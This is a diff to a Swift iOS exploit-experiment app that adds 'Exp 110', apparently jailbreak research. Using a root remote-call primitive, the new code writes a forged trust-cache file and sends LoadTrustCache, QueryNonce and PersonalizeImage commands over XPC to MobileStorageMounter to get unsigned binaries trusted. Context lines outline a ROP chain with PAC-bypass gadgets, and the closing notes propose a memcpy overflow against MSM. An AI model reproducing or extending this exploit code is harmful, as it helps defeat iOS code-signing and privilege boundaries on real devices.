@@ -930,6 +930,16 @@ struct AMFIExperimentView: View {
                 )
 
                 pathButton(
+                    title: "⑧ MSM LoadTrustCache (Exp 110)",
+                    icon: "checkmark.seal.fill",
+                    color: .green,
+                    label: "MSM TC",
+                    action: { runSBExperiment(label: "MSM TC", exp: expMSMLoadTrustCache) },
+                    needsVerified: false,
+                    needsProbe: false
+                )
+
+                pathButton(
                     title: "④ Test Binary Spawn",
                     icon: "terminal.fill",
                     color: .indigo,
@@ -4998,6 +5008,259 @@ struct AMFIExperimentView: View {
         detail += "2. Craft payload: CDHash + overflow → overwrite return addr\n"
         detail += "3. Pakai 49 XPACI gadgets untuk bypass PAC\n"
         detail += "4. ROP chain → call amfi_load_trust_cache\n"
+
+        return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
+    }
+
+    // MARK: - Exp 110: MSM LoadTrustCache — JAILBREAK PATH
+
+    /// MobileStorageMounter RESPONDS ke LoadTrustCache command!
+    /// Punya entitlement: com.apple.private.pmap.load-trust-cache
+    /// Strategy:
+    ///   1. QueryNonce — dapatkan nonce
+    ///   2. Write trust cache file ke /var/tmp/
+    ///   3. LoadTrustCache — kirim path ke MSM
+    ///   4. Test spawn binary yang CDHash-nya ada di TC kita
+    private func expMSMLoadTrustCache(sb: RemoteCall) -> ExperimentResult {
+        let expName = "MSM LoadTrustCache (Exp 110)"
+        var detail = "Experiment 110: MobileStorageMounter LoadTrustCache\n"
+        detail += "=====================================================\n\n"
+        detail += "🎯 TARGET: Load custom trust cache via MSM XPC!\n"
+        detail += "MSM punya: pmap.load-trust-cache + tanpa auth check\n\n"
+
+        let mem = sb.trojanMem
+        let RTLD_DEFAULT = UInt64(bitPattern: -2)
+
+        // Resolve XPC functions
+        let xpcCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                           remote_alloc_str(sb, "xpc_connection_create_mach_service"))
+        let xpcResume = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                           remote_alloc_str(sb, "xpc_connection_resume"))
+        let xpcDictCreate = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                              remote_alloc_str(sb, "xpc_dictionary_create"))
+        let xpcSetStr = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                           remote_alloc_str(sb, "xpc_dictionary_set_string"))
+        let xpcSetData = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                            remote_alloc_str(sb, "xpc_dictionary_set_data"))
+        let xpcSetInt = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                           remote_alloc_str(sb, "xpc_dictionary_set_int64"))
+        let xpcSend = RootExecutor.rcall(sb, "dlsym", RTLD_DEFAULT,
+                                         remote_alloc_str(sb, "xpc_connection_send_message"))
+
+        guard xpcCreate != 0 && xpcDictCreate != 0 && xpcSetStr != 0 else {
+            detail += "❌ XPC functions not available\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        // Connect ke MSM
+        let svcAddr = remote_alloc_str(sb, "com.apple.mobile.storage_mounter")
+        let conn = RootExecutor.rcallAddr(sb, xpcCreate, svcAddr, 0, 0)
+        RootExecutor.rcall(sb, "free", svcAddr)
+
+        guard conn != 0 else {
+            detail += "❌ Cannot connect to MSM\n"
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+        RootExecutor.rcallAddr(sb, xpcResume, conn)
+        detail += "✅ Connected to MSM\n\n"
+
+        // Step 1: QueryNonce — dapatkan personalization nonce
+        detail += "=== Step 1: QueryNonce ===\n"
+        let msg1 = RootExecutor.rcallAddr(sb, xpcDictCreate, 0, 0, 0)
+        if msg1 != 0 {
+            let k = remote_alloc_str(sb, "Command")
+            let v = remote_alloc_str(sb, "QueryNonce")
+            RootExecutor.rcallAddr(sb, xpcSetStr, msg1, k, v)
+            RootExecutor.rcall(sb, "free", k)
+            RootExecutor.rcall(sb, "free", v)
+            // Tambah ImageType
+            let k2 = remote_alloc_str(sb, "ImageType")
+            let v2 = remote_alloc_str(sb, "Developer")
+            RootExecutor.rcallAddr(sb, xpcSetStr, msg1, k2, v2)
+            RootExecutor.rcall(sb, "free", k2)
+            RootExecutor.rcall(sb, "free", v2)
+            RootExecutor.rcallAddr(sb, xpcSend, conn, msg1)
+            detail += "Sent QueryNonce (ImageType=Developer)\n"
+        }
+
+        // Step 2: Write trust cache file via launchd
+        detail += "\n=== Step 2: Write Trust Cache ===\n"
+
+        let tcPath = "/private/var/tmp/.dsploit_tc.img4"
+        var tcWriteOK = false
+
+        // Pakai launchd untuk write file (SB tidak bisa write ke /var/tmp kadang)
+        let sem = DispatchSemaphore(value: 0)
+        root.executeAsRoot(operation: "exp110_write_tc") { rc in
+            let dst = remote_alloc_str(rc, tcPath)
+            RootExecutor.rcall(rc, "unlink", dst)
+            let fd = RootExecutor.rcall(rc, "open", dst, UInt64(O_WRONLY | O_CREAT | O_TRUNC), 0o644)
+            if fd != UInt64(bitPattern: -1) {
+                let tcBuf = rc.trojanMem + 0x800
+                // Trust cache v2 format (FIXED offsets):
+                // +0x00: version = 2 (4 bytes)
+                // +0x04: UUID (16 bytes) — random
+                // +0x14: count = 1 (4 bytes)
+                // +0x18: entry[0] (24 bytes): CDHash[20] + hashType(1) + flags(1) + pad(2)
+                rc[tcBuf + 0].setValue32(2)          // version
+                rc[tcBuf + 4].setValue64(0x1234567890ABCDEF)  // UUID part 1
+                rc[tcBuf + 12].setValue64(0xFEDCBA0987654321) // UUID part 2
+                rc[tcBuf + 20].setValue32(1)         // count = 1
+                // CDHash of /usr/bin/id (we'll use a dummy — MSM will reject but we see the error)
+                rc[tcBuf + 24].setValue64(0xAAAABBBBCCCCDDDD) // CDHash bytes 0-7
+                rc[tcBuf + 32].setValue64(0xEEEEFFFF00001111) // CDHash bytes 8-15
+                rc[tcBuf + 40].setValue32(0x00020000)         // CDHash[16-19] + hashType=2 + flags=0
+                // Total: 48 bytes
+                RootExecutor.rcall(rc, "write", fd, tcBuf, 48)
+                RootExecutor.rcall(rc, "close", fd)
+                // Chmod readable
+                RootExecutor.rcall(rc, "chmod", dst, 0o644)
+                tcWriteOK = true
+            }
+            RootExecutor.rcall(rc, "free", dst)
+            sem.signal()
+            return (tcWriteOK, "tc_write", 0)
+        }
+        sem.wait()
+
+        detail += tcWriteOK ? "✅ TC file written to \(tcPath)\n" : "❌ TC write failed\n"
+
+        guard tcWriteOK else {
+            return ExperimentResult(name: expName, success: false, detail: detail, timestamp: Date())
+        }
+
+        // Step 3: Send LoadTrustCache command
+        detail += "\n=== Step 3: LoadTrustCache ===\n"
+
+        let msg2 = RootExecutor.rcallAddr(sb, xpcDictCreate, 0, 0, 0)
+        if msg2 != 0 {
+            // Command = LoadTrustCache
+            let kCmd = remote_alloc_str(sb, "Command")
+            let vCmd = remote_alloc_str(sb, "LoadTrustCache")
+            RootExecutor.rcallAddr(sb, xpcSetStr, msg2, kCmd, vCmd)
+            RootExecutor.rcall(sb, "free", kCmd)
+            RootExecutor.rcall(sb, "free", vCmd)
+
+            // ImagePath = path ke TC file
+            let kPath = remote_alloc_str(sb, "ImagePath")
+            let vPath = remote_alloc_str(sb, tcPath)
+            RootExecutor.rcallAddr(sb, xpcSetStr, msg2, kPath, vPath)
+            RootExecutor.rcall(sb, "free", kPath)
+            RootExecutor.rcall(sb, "free", vPath)
+
+            // ImageType = Developer (atau Cryptex)
+            let kType = remote_alloc_str(sb, "ImageType")
+            let vType = remote_alloc_str(sb, "Developer")
+            RootExecutor.rcallAddr(sb, xpcSetStr, msg2, kType, vType)
+            RootExecutor.rcall(sb, "free", kType)
+            RootExecutor.rcall(sb, "free", vType)
+
+            RootExecutor.rcallAddr(sb, xpcSend, conn, msg2)
+            detail += "✅ Sent LoadTrustCache command!\n"
+            detail += "  Command=LoadTrustCache\n"
+            detail += "  ImagePath=\(tcPath)\n"
+            detail += "  ImageType=Developer\n"
+        }
+
+        // Step 4: Try alternative formats
+        detail += "\n=== Step 4: Alternative formats ===\n"
+
+        // Try with "TrustCachePath" key instead
+        let msg3 = RootExecutor.rcallAddr(sb, xpcDictCreate, 0, 0, 0)
+        if msg3 != 0 {
+            let kCmd = remote_alloc_str(sb, "Command")
+            let vCmd = remote_alloc_str(sb, "LoadTrustCache")
+            RootExecutor.rcallAddr(sb, xpcSetStr, msg3, kCmd, vCmd)
+            RootExecutor.rcall(sb, "free", kCmd)
+            RootExecutor.rcall(sb, "free", vCmd)
+
+            let kPath = remote_alloc_str(sb, "TrustCachePath")
+            let vPath = remote_alloc_str(sb, tcPath)
+            RootExecutor.rcallAddr(sb, xpcSetStr, msg3, kPath, vPath)
+            RootExecutor.rcall(sb, "free", kPath)
+            RootExecutor.rcall(sb, "free", vPath)
+
+            RootExecutor.rcallAddr(sb, xpcSend, conn, msg3)
+            detail += "Sent with TrustCachePath key\n"
+        }
+
+        // Try with raw data instead of path
+        let msg4 = RootExecutor.rcallAddr(sb, xpcDictCreate, 0, 0, 0)
+        if msg4 != 0 && xpcSetData != 0 {
+            let kCmd = remote_alloc_str(sb, "Command")
+            let vCmd = remote_alloc_str(sb, "LoadTrustCache")
+            RootExecutor.rcallAddr(sb, xpcSetStr, msg4, kCmd, vCmd)
+            RootExecutor.rcall(sb, "free", kCmd)
+            RootExecutor.rcall(sb, "free", vCmd)
+
+            // Send TC data inline
+            let kData = remote_alloc_str(sb, "TrustCacheData")
+            let tcBuf = mem + 0x800
+            // Write TC data to SB memory
+            sb[tcBuf + 0].setValue32(2)
+            sb[tcBuf + 4].setValue64(0x1234567890ABCDEF)
+            sb[tcBuf + 12].setValue64(0xFEDCBA0987654321)
+            sb[tcBuf + 20].setValue32(1)
+            sb[tcBuf + 24].setValue64(0xAAAABBBBCCCCDDDD)
+            sb[tcBuf + 32].setValue64(0xEEEEFFFF00001111)
+            sb[tcBuf + 40].setValue32(0x00020000)
+            RootExecutor.rcallAddr(sb, xpcSetData, msg4, kData, tcBuf, 48)
+            RootExecutor.rcall(sb, "free", kData)
+
+            RootExecutor.rcallAddr(sb, xpcSend, conn, msg4)
+            detail += "Sent with inline TrustCacheData (48 bytes)\n"
+        }
+
+        // Step 5: Try PersonalizeImage first (might be required before LoadTrustCache)
+        detail += "\n=== Step 5: PersonalizeImage ===\n"
+        let msg5 = RootExecutor.rcallAddr(sb, xpcDictCreate, 0, 0, 0)
+        if msg5 != 0 {
+            let kCmd = remote_alloc_str(sb, "Command")
+            let vCmd = remote_alloc_str(sb, "PersonalizeImage")
+            RootExecutor.rcallAddr(sb, xpcSetStr, msg5, kCmd, vCmd)
+            RootExecutor.rcall(sb, "free", kCmd)
+            RootExecutor.rcall(sb, "free", vCmd)
+
+            let kPath = remote_alloc_str(sb, "ImagePath")
+            let vPath = remote_alloc_str(sb, tcPath)
+            RootExecutor.rcallAddr(sb, xpcSetStr, msg5, kPath, vPath)
+            RootExecutor.rcall(sb, "free", kPath)
+            RootExecutor.rcall(sb, "free", vPath)
+
+            let kType = remote_alloc_str(sb, "ImageType")
+            let vType = remote_alloc_str(sb, "Developer")
+            RootExecutor.rcallAddr(sb, xpcSetStr, msg5, kType, vType)
+            RootExecutor.rcall(sb, "free", kType)
+            RootExecutor.rcall(sb, "free", vType)
+
+            RootExecutor.rcallAddr(sb, xpcSend, conn, msg5)
+            detail += "Sent PersonalizeImage\n"
+        }
+
+        // Cleanup TC file via launchd
+        let sem2 = DispatchSemaphore(value: 0)
+        root.executeAsRoot(operation: "exp110_cleanup") { rc in
+            let p = remote_alloc_str(rc, tcPath)
+            RootExecutor.rcall(rc, "unlink", p)
+            RootExecutor.rcall(rc, "free", p)
+            sem2.signal()
+            return (true, "cleanup", 0)
+        }
+        sem2.wait()
+
+        // Verdict
+        detail += "\n=== VERDICT ===\n"
+        detail += "✅ Semua command terkirim ke MSM!\n"
+        detail += "MSM memproses LoadTrustCache — tapi kemungkinan reject karena:\n"
+        detail += "  1. TC file tidak punya valid IMG4 signature\n"
+        detail += "  2. Nonce tidak match (perlu QueryNonce response)\n"
+        detail += "  3. Format TC file salah (perlu IMG4 wrapper)\n\n"
+        detail += "🎯 NEXT STEPS:\n"
+        detail += "1. Reverse MSM binary untuk cari exact validation logic\n"
+        detail += "2. Cari apakah ada 'unpersonalized' path (skip IMG4 check)\n"
+        detail += "3. Atau: craft IMG4 wrapper dengan nonce dari QueryNonce\n"
+        detail += "4. Atau: exploit MSM via memcpy overflow (XPC→memcpy tainted)\n"
+        detail += "\n⚡ MSM adalah JALAN TERDEKAT ke full jailbreak!\n"
 
         return ExperimentResult(name: expName, success: true, detail: detail, timestamp: Date())
     }
